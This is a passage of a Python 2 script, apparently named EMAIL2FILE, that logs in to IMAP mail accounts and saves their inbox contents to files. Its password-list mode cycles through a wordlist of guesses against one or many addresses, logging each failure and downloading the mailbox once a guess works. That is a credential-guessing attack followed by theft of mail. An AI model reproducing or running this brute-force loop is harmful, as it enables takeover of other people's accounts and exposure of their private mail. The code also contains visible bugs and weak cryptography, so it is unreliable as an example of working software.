               if encryptsel.lower() == 'y':
                  lnpass = AES_Dec(cipher, lnpass)

               elif b64sel.lower() == 'y':
                  lnpass = base64.b64decode(lnpass)
                  
               lnpass = lnpass.strip()
               lnpass = lnpass.replace("\n","")
               lnpass = str(lnpass)
               loginok = checklogin(lnemail, lnpass, imap_server, sslcon)
               tries += 1

               if 'OK' not in loginok and tries <= listlen:
                  #print('tried: %s') % str(lnpass)
                  if usecolor == 'color':
                     print('\n\033[31mLOGIN FAILED for %s. \033[34;1mtrying next entry...\033[0m\n' % lnemail)
                     print('\033[33mtries: \033[35m' + str(tries) + '\033[33m out of \033[35m %s \033[0m' % str(listlen))
                     print('\n\033[34m------------------------------------------------------------\033[0m\n')
                  else:
                     print('\nLOGIN FAILED for %s. trying next entry...\n') % str(lnemail)
                     print('tries: ' + str(tries) + ' out of ' + str(listlen))
                     print('\n------------------------------------------------------------\n')
                  logging.warning('LOGIN FAILED for ' + str(lnemail) + '. tried ' + str(tries) + 'entries out of ' + str(listlen))
                  continue

               else:
                  print('\ngetting mailbox contents...\n')
                  logging.info('LOGIN to %s successful! getting mailbox contents...' % lnemail)
                  getimap(lnemail, lnpass.strip(), imap_server, sslcon)
                  tries = 100
                  break

            if tries >= listlen and tries < 100:
               if usecolor == 'color':
                  print('\n\033[35mexhausted all entries in password list for:\033[33m %s.\n\033[0m' % lnemail)
               else:
                  print('\nexhausted all entries in password list for %s.\n' % lnemail)
               logging.warning('all entries in password list exhausted for %s' % lnemail)
         
         efcount += 1
         
         if usecolor == 'color':
            print("remaining email addresses to process:\033[32;1m %s \033[0m\n" % str(countdown))
            print("PERCENT COMPLETE:\033[36;1m %s \033[0m\n" % progress(pr))
            print('\n\033[34m------------------------------------------------------------\033[0m\n')
         else:
            print("PERCENT COMPLETE: %s \n" % progress(pr))
               
         if countdown <= 0 and efcount >= lenfile:
            if usecolor == 'color':
               print('\033[41;1m\033[33mfinished processing all email addresses and passwords.\033[0m\n')
            else:
               print('finished processing all email addresses and passwords.\n')
            logging.info('successfully processed all email addresses and passwords.')
            break
            
   # NOT USING PASSWORD LIST
   else:
   
      efcount = 1
      
      while efcount <= eflen:
         for line in ef.readlines():

            # WITH EMAIL AND PASSWORD IN SAME FILE
            if re.search(r'^[\,]$', line):

               line = line.strip()
               linevals = line.split(",")

               lnemail = linevals[0]
               lnemail = str(lnemail.strip())
               lnpass = linevals[1]
               lnpass = str(lnpass.strip())
               lnpass = lnpass.replace("\n","")
               if not filter(lambda x: x>'\x7f', lnpass):
                  lnpass = base64.b64decode(lnpass)
               print('using email address: ' + lnemail)

            else:
               lnemail = line.strip()
               print('using email address: ' + lnemail)
               lnpass = getpass.getpass('please enter password for above account --> ')
            atdomain = re.search("@.*", emailaddr).group()
            emaildomain = atdomain[1:]

            imap_server = 'imap.' + emaildomain
            imap_port = 993
            
            if usecolor == 'color':
               print(ac.YELLOW + 'based on email address, using IMAP server: ' + ac.PINKBOLD + imap_server + ac.CLEAR)
            else:
               print('based on email address, using IMAP server: %s' % imap_server)
            
            resolved = resolveimap(imap_server)
            
            if len(resolved) < 1:
               resolved = resolveimap(imap_server)
            
            imap_server = resolved
               
            loginok = checklogin(lnemail, lnpass, imap_server, sslcon)
            print(loginok)

            while 'OK' not in loginok:
               lnpass = getpass.getpass('login failure. please check password and enter again --> ')
               logging.warning('login failed for %s' % lnemail)
               loginok = checklogin(lnemail, lnpass, imap_server, sslcon)
               print(loginok)
               if 'OK' in loginok:
                  break
               else:
                  print('login failure. trying next entry..')
                  continue

            efcount += 1

            logging.info('LOGIN to %s successful' % lnemail)
            getimap(lnemail, lnpass, imap_server, sslcon)

      if efcount > eflen:
         print("all emails and passwords have been processed.")
         logging.info('processing complete for all emails and passwords. exiting program..')
         sys.exit(0)

# SINGLE EMAIL ADDRESS
else:

   emailaddr = raw_input('please enter email address --> ')

   #VALIDATE EMAIL USING REGEX
   match = re.search(r'^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,9})$', emailaddr)

   if match:
      if usecolor == 'color':
         print('\033[32m\nemail is valid\033[0m\n')

      else:
         print('email is valid\n')
      
      atdomain = re.search("@.*", emailaddr).group()
      emaildomain = atdomain[1:]

      imap_server = 'imap.' + emaildomain
      imap_port = 993
      
      resolved = resolveimap(imap_server)
            
      if len(resolved) < 1:
         resolved = resolveimap(imap_server)
      
      imap_server = resolved
      
   else:
      tries = 5

      while tries > 0:

         if usecolor == 'color':
            print('\033[31minvalid email format\033[0m\n')
            print('bad attempts: \033[33m' + str(6 - tries) + '\033[0m\n')
            print('\033[36myou have ' + str(tries) + ' attempts remaining.\033[0m\n')

         else:
            print('invalid email format')
            print('bad attempts: ' + str(6 - tries))
            print('you have ' + str(tries) + 'attempts remaining.')
         
         logging.warning('submitted invalid email format %s times' % str(6 - tries))

         emailaddr = raw_input('please enter email again --> ')

         if match:
            tries = -1
            break

         else:
            tries = tries - 1

      if tries == 0:
         if usecolor == 'color':
            print('\033[31m too many bad attempts using invalid format! \033[0m\n')
         else:
            print('too many bad attempts using invalid format!')

         logging.error('too many bad attempts using unproperly formatted email string %s. aborting program.') % str(emailaddr.strip())
         print('aborting program..')
         sys.exit(1)
      
      elif tries == -1:
         if usecolor == 'color':
            print('\n\033[32m email is valid \033[0m')
         else:
            print('email is valid')

      else:
         if usecolor == 'color':
            print('\033[31mERROR: unhandled exception. aborting..\033[0m\n')
         else:
            print('ERROR: unhandled exception. aborting..\n')
         logging.error('unhandled exception. aborting program.')
         sys.exit(1)

   # USING PASSWORD LIST
   if usewordlist.lower() == 'y':
   
      pwlistfile = raw_input('please make sure password list is in the script directory, then enter the filename --> ')
      while not os.path.isfile(pwlistfile):
         pwlistfile = raw_input('the path to the word list file you entered is not valid. please check the file and enter again --> ')

      encryptsel = raw_input('is the word list encrypted using encryptlist.py? Y/N --> ')      
      while not re.search(r'^[nNyY]$', encryptsel):
         encryptsel = raw_input('invalid selection. enter Y if word list was encrypted using encryptlist.py or N if not encrypted --> ')
      
      # IF PASSWORD LIST NOT ENCRYPTED  
      if encryptsel.lower() == 'n':
      
         b64sel = raw_input('is the word list base64-encoded using encodelist.py? Y/N --> ')
         while not re.search(r'^[nNyY]$', b64sel):
            b64sel = raw_input('invalid selection. enter Y if word list is base64-encoded or N if plain text --> ')

         if b64sel.lower() == 'n':         
            gotoencsel = raw_input('storing passwords in plaintext is a security risk. \nenter 1 to encrypt the contents of your password list. \nenter 2 to use base-64 encoding. enter 3 to continue with a plaintext password list. --> ')
            while not re.search(r'^[1-3]$', gotoencsel):
               gotoencsel = raw_input('invalid selection. enter 1 to run script to encrypt your password list. \nenter 2 to base64-encode it. or enter 3 to continue with plaintext list --> ')
            if gotoencsel == '1':
               print("launching encryptlist.py..")
               os.system('chmod +x encryptlist.py')
               os.system('python encryptlist.py')
            elif gotoencsel == '2':
               print("launching encodelist.py..")
               os.system('chmod +x encodelist.py')
               os.system('python encodelist.py')
            else:
               print('*** to encrypt your list in the future, run \'python encryptlist.py\'. to  base64-encode your list in the future, run \'python encodelist.py\' ***')
      
      # USING ENCRYPTED LIST  
      else:
         secretkey = 'secret.key'
         if os.path.isfile('secret.key'):
            if usecolor == 'color':
               print('base64-encoded key generated by encryptlist.py found at ' + ac.GREEN + 'secret.key' + ac.CLEAR + '.')
            else:
               print('base64-encoded key generated by encryptlist.py found at secret.key.')
            keycheck = raw_input('press ENTER to use secret.key or enter the filename of your encryption key --> ')
            if len(keycheck) > 1:
               while not os.path.isfile(keycheck):
                  keycheck = raw_input('file not found. please check the filename and enter again --> ')
               secretkey = keycheck
            else:
               secretkey = 'secret.key'
         
         else:
            secretkey = raw_input('secret.key not found. please enter the filename of your encryption key --> ')
            while not os.path.isfile(secretkey):
               secretkey = raw_input('file not found. please check filename and enter again --> ')

         encpass = getpass.getpass('please enter the secret passphrase used to generate the encrypted file --> ')
         AES_Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('&')
         cryptfile = open(secretkey, 'r')
         a = cryptfile.readline()
         cryptkey = base64.b64decode(a)
         cryptfile.close()

         secretpadlen = 16 - (len(encpass) % 16)
         secret = encpass + ('&' * secretpadlen)
         cipher = AES.new(cryptkey, AES.MODE_CBC, secret)
         print('using encryption key: ')
         if usecolor == 'color':
            print(ac.ORANGE + a + ac.CLEAR)
         else:
            print(a)
      
      print("\nusing word list: ")
      if usecolor == 'color':
         print(ac.OKAQUA + pwlistfile + ac.CLEAR)
      else:
         print(pwlistfile)
      
      pf = open(pwlistfile, "r+")
      wordlist = pf.readlines()
      listlen = len(wordlist)

      count = 0

      for emailpass in wordlist:
      
         if encryptsel.lower() == 'y':
            emailpass = AES_Dec(cipher, emailpass)

         elif b64sel.lower() == 'y':
            emailpass = base64.b64decode(emailpass)
                              
         emailpass = emailpass.strip()
         emailpass = emailpass.replace("\n","")
         emailpass = str(emailpass)
         loginok = checklogin(emailaddr, emailpass, imap_server, sslcon)
         count += 1
         
         # WRONG PASSWORD
         if 'AUTHEN' in loginok:
            print("Wrong login credentials supplied for %s. Skipping to next password..." % emailaddr)
            logging.warning('invalid password for %s. skipping to next password.' % emailaddr)
            continue

         # PASSWORD NOT CORRECTLY FORMATTED
         elif 'BAD' in loginok:
            emailpass = emailpass.strip()
            print("password format error. trying again..\n")
            logging.warning('bad password format for %s' % emailaddr)
            loginok = checklogin(emailaddr, emailpass, imap_server, sslcon)
            loginok = str(loginok)
            if 'OK' in loginok:
               logging.info('INFO: LOGIN to %s successful' % emailaddr)
               getimap(emailaddr, emailpass, imap_server, sslcon)
               if usecolor == 'color':
                  print("inbox contents have been saved to file for email: " + ac.OKAQUA + emailaddr + ac.CLEAR)
               else:
                  print("inbox contents have been saved to file for email: %s" % emailaddr)
               logging.info('saved inbox contents to file for %s' % emailaddr)
               count = 100
               tries = -1
               break

         if 'OK' not in loginok and count <= listlen:
            tries = -1
            if usecolor == 'color':
               print('\n\033[31mLOGIN FAILED. \033[34;1mtrying next entry...\033[0m\n')
               print('\033[33mtries: \033[35m' + str(count) + '\033[33m out of \033[35m %s \033[0m' % str(listlen))
            else:
               print('\nLOGIN FAILED. trying next entry...\n')
               print('tries: ' + str(count) + ' out of ' + str(listlen))
            logging.warning('LOGIN FAILED for ' + emailaddr + '. tried ' + str(count) + ' entries out of ' + str(listlen) + ' total.')
            print('\n')
            continue

         else:
            count = 100
            tries = -1
            logging.info('LOGIN to %s successful!' % emailaddr)
            getimap(emailaddr, emailpass.strip(), imap_server, sslcon)
            #homedir = os.path.expanduser("~")
            #rootdir = os.path.join(homedir, 'email-output')
            rootdir = 'email-output'
            print("inbox contents saved to directory: %s" % rootdir)
            print("\nexiting program..\n")
            sys.exit(0)
            break

      if count >= listlen and count < 100:
         tries = -1
         if usecolor == 'color':
            print('\n\033[35mexhausted all entries in password list for:\033[33m %s.\n\033[0m' % emailaddr)
         else:
            print('\nexhausted all entries in password list for %s.\n' % emailaddr)
         print('exiting program..\n')
         sys.exit(1)

   else:

      emailpass = getpass.getpass('please enter password --> ')
      getimap(emailaddr, emailpass, imap_server, sslcon)

logging.info("exited application.")
logging.shutdown()
print("thanks for using EMAIL2FILE! \nexiting program..\n")
sys.exit(0)
